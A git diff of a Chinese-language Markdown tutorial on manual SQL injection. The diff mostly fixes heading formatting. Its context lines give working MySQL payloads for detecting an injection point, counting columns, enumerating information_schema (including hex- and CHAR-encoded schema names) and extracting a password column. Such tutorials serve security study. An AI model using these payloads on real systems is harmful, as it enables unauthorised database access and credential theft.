@@ -1,4 +1,4 @@
-#SQL手工注入基础
+# SQL手工注入基础
 ```
 Author:C0d3r1iu 有什么疑惑可以随时联系我
 mail:admin@recorday.cn
@@ -6,11 +6,11 @@ mail:admin@recorday.cn
 ***
 
 
-#标准手工注入流程
+# 标准手工注入流程
 
-###1.探测注入点
+### 1.探测注入点
 
-####1.测试注入点是否存在
+#### 1.测试注入点是否存在
 
 常用方法：
 
@@ -31,9 +31,9 @@ payload:`' or 1=1# `
 
 如果是信息显示类注入点，还可以用and 1=1 和and 1=2 ，前者返回成功，后者返回失败来进行判断，这里不再赘述。
 
-###2.探测注入点之后，收集信息
+### 2.探测注入点之后，收集信息
 
-####1.union select 联合查询
+#### 1.union select 联合查询
 
 在联合查询前，需要判断能显示字段的数量，用到order by 语句
 这里作为演示，猜字段数的区间小一点，尽可能用二分法，凭感觉也可以
@@ -69,7 +69,7 @@ database()数据库名
 user()获取当前用户
 @@ version_compile_os 操作系统信息
 
-####2.查询information_schema
+#### 2.查询information_schema
 
 如果mysql版本大于5.0，可以对默认表进行读取进行更多信息的探索:
 payload如下：
@@ -93,11 +93,11 @@ payload2如下：
 
 `' union select 1,2,table_name from information_schema.tables where table_schema=0x696E6A656374 #`
 
-同理payload2如下：
+同理payload3如下：
 
 `' union select 1,2,table_name from information_schema.tables where table_schema=CHAR(105,110,106,101,99,116)#';`
 
-####3.读完表名读字段
+#### 3.读完表名读字段
 
 把上一步的table换成column就可以了
 
@@ -105,7 +105,7 @@ payload：
 
 `' union select 1,2,column_name from information_schema.columns where table_name='dbinfo`
 
-####4.读取表内部具体内容
+#### 4.读取表内部具体内容
 
 这里注意要带上库的名字，看程序具体怎么写
 
@@ -114,5 +114,6 @@ payload:
 `' union select 1,2,password from inject.dbinfo#`
 
 到了这里，一次完整的注入基本就完成了
+
 
 
